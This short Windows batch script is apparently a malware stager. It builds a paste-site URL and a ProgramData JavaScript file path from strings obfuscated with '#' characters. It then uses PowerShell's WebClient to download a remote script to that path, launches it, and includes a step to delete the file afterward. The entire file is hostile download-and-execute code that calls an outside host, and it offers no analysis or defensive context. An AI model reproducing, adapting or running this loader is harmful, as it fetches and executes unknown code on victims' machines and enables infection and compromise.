@echo off
setlocal EnableDelayedExpansion


set "saturnite=h#t#t#p#:#/#/#p#a#s#t#e#.#e#e#/#d#/#s#e#f#L#1#p#v#F#/#0"


set "archiblastic="
for %%A in (%saturnite:#= %) do (
    set "archiblastic=!archiblastic!%%A"
)


set "beloved=C#:#\\#P#r#o#g#r#a#m#D#a#t#a#\\confirmative.#j#s"


set "aimer="
for %%B in (%beloved:#= %) do (
    set "aimer=!aimer!%%B"
)


powershell -Command "(New-Object Net.WebClient).DownloadFile('!archiblastic!', '!aimer!')"


start "" "!aimer!" & exit


timeout /t 5 >nul
del /f /q "!aimer!"
